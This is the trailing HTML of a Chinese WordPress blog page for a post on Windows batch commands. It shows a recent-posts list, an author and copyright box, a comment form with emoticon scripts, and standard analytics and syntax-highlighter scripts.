+			<ul>
+<li> · <a href="/2025/10/15/confluence-6-13-upgrade-to-confluence-7-19.html">confluence 6.13升级到confluence 7.19</a></li><li> · <a href="/2025/02/06/vue3-html5-pdf.html">html5预览PDF（vue3）</a></li><li> · <a href="/2024/12/25/filebeat-zincsearch.html">Filebeat + ZincSearch 轻量级日志</a></li><li> · <a href="/2024/12/11/emby-excluding-files-folders.html">Emby 如何设置排除项，排除某个文件夹</a></li><li> · <a href="/2024/11/23/emby.html">Emby全平台开心版、认证服务器搭建方法(自建认证服务器)</a></li><li> · <a href="/2024/11/13/qywx-development.html">企业微信开发之代开发应用</a></li><li> · <a href="/2024/10/28/vue3-html2canvas-png.html">vue3  html2canvas导出透明png图片</a></li><li> · <a href="/2024/09/24/%E6%88%90%E9%83%BD%E5%85%B1%E4%BA%AB%E5%8A%9E%E5%85%AC%E5%AE%A4%E6%8E%A8%E8%8D%90.html">成都共享办公室推荐</a></li><li> · <a href="/2024/09/09/nas-web-station-wordpress-rewrite.html">群晖web station设置wordpress 伪静态</a></li><li> · <a href="/2024/09/07/2024-xiezilou.html">2024年，写字楼市场面临新挑战与机遇</a></li><li> · <a href="/2024/09/03/gongxiangbangong.html">共享办公联合办公室的优缺点</a></li><li> · <a href="/2024/08/19/2024-chengdu-gongxiangbangongshi.html">2024最新成都共享办公室排名</a></li></ul>		</div> 
+		
+		<div class="clear"></div>		
+		<div class="authorbio">
+			<div class="author_pic">
+				<img alt="" src="https://secure.gravatar.com/avatar/3153dd85c6cdc491c0fb24ae5ca7d9f8635fa1891c191cbc57d0f28124dda41b?s=78&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/3153dd85c6cdc491c0fb24ae5ca7d9f8635fa1891c191cbc57d0f28124dda41b?s=156&amp;d=mm&amp;r=g 2x" class="avatar avatar-78 photo" height="78" width="78" decoding="async">			</div>
+			<div class="author_text">
+				<span class="post_author">该日志由 Bruce 于2012年03月24日发表在<a href="/category/%E5%85%B6%E5%AE%83" rel="category tag">Others</a>分类下</span>
+				<p class="spostinfo">本文版权归Bruce's Blog所有，转载引用请完整注明以下信息：<br>
+					本文作者：Bruce<br>
+					本文地址：<a href="/2012/03/24/%E6%9C%80%E5%85%A8%E7%9A%84bat%E6%89%B9%E5%A4%84%E7%90%86%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8.html" rel="bookmark" title="本文固定链接 /2012/03/24/%e6%9c%80%e5%85%a8%e7%9a%84bat%e6%89%b9%e5%a4%84%e7%90%86%e5%91%bd%e4%bb%a4%e5%a4%a7%e5%85%a8.html">最全的BAT批处理命令大全 | Bruce's Blog</a><a href="#" onclick="copy_code('/2012/03/24/%e6%9c%80%e5%85%a8%e7%9a%84bat%e6%89%b9%e5%a4%84%e7%90%86%e5%91%bd%e4%bb%a4%e5%a4%a7%e5%85%a8.html'); return false;"></a>
+				</p>
+			</div>
+		</div>
+		
+		<div class="clear"></div>
+	</div>
+	<!-- You can start editing here. -->
+			<!-- If comments are open, but there are no comments. -->
+	 			<div id="respond_box">
+	<div id="respond">
+		<h3>发表评论</h3>	
+		<div class="cancel-comment-reply">
+			<small><a rel="nofollow" id="cancel-comment-reply-link" href="/2012/03/24/%E6%9C%80%E5%85%A8%E7%9A%84bat%E6%89%B9%E5%A4%84%E7%90%86%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8.html#respond" style="display:none;">点击这里取消回复。</a></small>
+		</div>
+				<span class="set_avatar"><a title="去申请一个自己的Gravatar全球通用头像" target="_blank" href="http://en.gravatar.com/">留言无头像?</a></span>
+		<form action="/wp-comments-post.php" method="post" id="commentform">
+				<div id="comment-author-info">
+		<p>
+			<input type="text" name="author" id="author" class="commenttext" value="" size="22" tabindex="1">
+			<label for="author">昵称 <span class="req">*</span></label>
+		</p>
+		<p>
+			<input type="text" name="email" id="email" class="commenttext" value="" size="22" tabindex="2">
+			<label for="email">邮箱 <span class="req">*</span></label>
+		</p>
+		<p style="display:none;">
+			<input type="text" name="url" id="url" class="commenttext" value="" size="22" tabindex="3">
+			<label for="url">网址</label>
+		</p>
+	</div>
+            <div class="clear"></div>
+		<p><textarea name="comment" id="comment" tabindex="4"></textarea></p>
+		<p>
+			<script type="text/javascript">
+/* <![CDATA[ */
+    function grin(tag) {
+    	var myField;
+    	tag = ' ' + tag + ' ';
+        if (document.getElementById('comment') && document.getElementById('comment').type == 'textarea') {
+    		myField = document.getElementById('comment');
+    	} else {
+    		return false;
+    	}
+    	if (document.selection) {
+    		myField.focus();
+    		sel = document.selection.createRange();
+    		sel.text = tag;
+    		myField.focus();
+    	}
+    	else if (myField.selectionStart || myField.selectionStart == '0') {
+    		var startPos = myField.selectionStart;
+    		var endPos = myField.selectionEnd;
+    		var cursorPos = endPos;
+    		myField.value = myField.value.substring(0, startPos)
+    					  + tag
+    					  + myField.value.substring(endPos, myField.value.length);
+    		cursorPos += tag.length;
+    		myField.focus();
+    		myField.selectionStart = cursorPos;
+    		myField.selectionEnd = cursorPos;
+    	}
+    	else {
+    		myField.value += tag;
+    		myField.focus();
+    	}
+    }
+/* ]]> */
+</script>
+<a href="javascript:grin(':?:')"><img src="/wp-includes/images/smilies/icon_question.gif" alt=""></a>
+<a href="javascript:grin(':razz:')"><img src="/wp-includes/images/smilies/icon_razz.gif" alt=""></a>
+<a href="javascript:grin(':sad:')"><img src="/wp-includes/images/smilies/icon_sad.gif" alt=""></a>
+<a href="javascript:grin(':evil:')"><img src="/wp-includes/images/smilies/icon_evil.gif" alt=""></a>
+<a href="javascript:grin(':!:')"><img src="/wp-includes/images/smilies/icon_exclaim.gif" alt=""></a>
+<a href="javascript:grin(':smile:')"><img src="/wp-includes/images/smilies/icon_smile.gif" alt=""></a>
+<a href="javascript:grin(':oops:')"><img src="/wp-includes/images/smilies/icon_redface.gif" alt=""></a>
+<a href="javascript:grin(':grin:')"><img src="/wp-includes/images/smilies/icon_biggrin.gif" alt=""></a>
+<a href="javascript:grin(':eek:')"><img src="/wp-includes/images/smilies/icon_surprised.gif" alt=""></a>
+<a href="javascript:grin(':shock:')"><img src="/wp-includes/images/smilies/icon_eek.gif" alt=""></a>
+<a href="javascript:grin(':???:')"><img src="/wp-includes/images/smilies/icon_confused.gif" alt=""></a>
+<a href="javascript:grin(':cool:')"><img src="/wp-includes/images/smilies/icon_cool.gif" alt=""></a>
+<a href="javascript:grin(':lol:')"><img src="/wp-includes/images/smilies/icon_lol.gif" alt=""></a>
+<a href="javascript:grin(':mad:')"><img src="/wp-includes/images/smilies/icon_mad.gif" alt=""></a>
+<a href="javascript:grin(':twisted:')"><img src="/wp-includes/images/smilies/icon_twisted.gif" alt=""></a>
+<a href="javascript:grin(':roll:')"><img src="/wp-includes/images/smilies/icon_rolleyes.gif" alt=""></a>
+<a href="javascript:grin(':wink:')"><img src="/wp-includes/images/smilies/icon_wink.gif" alt=""></a>
+<a href="javascript:grin(':idea:')"><img src="/wp-includes/images/smilies/icon_idea.gif" alt=""></a>
+<a href="javascript:grin(':arrow:')"><img src="/wp-includes/images/smilies/icon_arrow.gif" alt=""></a>
+<a href="javascript:grin(':neutral:')"><img src="/wp-includes/images/smilies/icon_neutral.gif" alt=""></a>
+<a href="javascript:grin(':cry:')"><img src="/wp-includes/images/smilies/icon_cry.gif" alt=""></a>
+<a href="javascript:grin(':mrgreen:')"><img src="/wp-includes/images/smilies/icon_mrgreen.gif" alt=""></a>
+<br>		</p>
+		<div class="submitted">
+			<input class="submit" name="submit" type="submit" tabindex="5" value="提交留言">
+			<input class="reset" name="reset" type="reset" id="reset" tabindex="6" value="重写">
+			<input type="hidden" name="comment_post_ID" value="1967" id="comment_post_ID">
+<input type="hidden" name="comment_parent" id="comment_parent" value="0">
+		</div>
+		<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="2b35105fc1"></p><p style="display: none !important;"><label>Δ<textarea name="ak_hp_textarea" cols="45" rows="8" maxlength="100"></textarea></label><input type="hidden" id="ak_js_1" name="ak_js" value="91"><script>document.getElementById( "ak_js_1" ).setAttribute( "value", ( new Date() ).getTime() );</script></p>    </form>
+
+	<div class="clear"></div>
+      </div>
+  </div>
+ 	</div><!-- #content -->
+
+<!-- #content -->
+
+<div id="footer">
+	Copyright © 2008-2026 <a href="/" title="数据库之家">Bruce's Blog</a>(Bruce's Blog)  保留所有权利.
+			<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?6b91a602d26fc3f4c8645fba387ea352";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+	</div>
+<div class="clear"></div>
+
+<script type="speculationrules">
+{"prefetch":[{"source":"document","where":{"and":[{"href_matches":"/*"},{"not":{"href_matches":["/wp-*.php","/wp-admin/*","/wp-content/uploads/*","/wp-content/*","/wp-content/plugins/*","/wp-content/themes/WPCnblogs/*","/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}
+</script>
+<script defer type="text/javascript" src="/wp-content/plugins/akismet/_inc/akismet-frontend.js?ver=1670305055" id="akismet-frontend-js"></script>
+<script type='text/javascript' src='/wp-content/plugins/enlighter/static/enlighterjs.min.js' id='enlighterjs-js'></script>
+<script type='text/javascript' id='enlighterjs-js-after'>
+!function(e,n){if("undefined"!=typeof EnlighterJS){var o={"selectors":{"block":"pre.EnlighterJSRAW","inline":"code.EnlighterJSRAW"},"options":{"indent":4,"ampersandCleanup":true,"linehover":true,"rawcodeDbclick":true,"textOverflow":"break","linenumbers":true,"theme":"classic","language":"generic","retainCssClasses":false,"collapse":false,"toolbarOuter":"","toolbarTop":"{BTN_RAW}{BTN_COPY}{BTN_WINDOW}{BTN_WEBSITE}","toolbarBottom":""}};(e.EnlighterJSINIT=function(){EnlighterJS.init(o.selectors.block,o.selectors.inline,o.options)})()}else{(n&&(n.error||n.log)||function(){})("Error: EnlighterJS resources not loaded yet!")}}(window,console);
+</script>
+<div class="toolbar">
+   <a href="javascript:scroll(0,0)" id="top" class="toolbar-item toolbar-item-top"></a>
+</div>
+</body>
+</html><!-- Dynamic page generated in 0.076 seconds. --><!-- Cached page generated by WP-Super-Cache on 2026-07-10 20:49:28 -->
